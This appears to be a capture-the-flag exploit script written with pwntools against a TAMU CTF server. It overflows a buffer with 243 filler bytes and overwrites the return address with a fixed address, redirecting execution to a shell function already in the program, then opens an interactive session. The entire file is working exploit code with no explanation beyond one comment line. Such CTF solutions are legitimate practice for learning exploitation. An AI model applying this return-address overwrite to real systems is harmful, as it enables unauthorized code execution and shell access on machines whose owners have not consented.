# buffer overflow leads to changed return address. A shell function is already part of the program.

from pwn import *

context.log_level = 'debug'

flag = 0x0804854b

r = remote('pwn.ctf.tamu.edu',4322)
exp = ("A" * 243)
exp += p32(flag)
r.sendline(exp)
r.interactive()
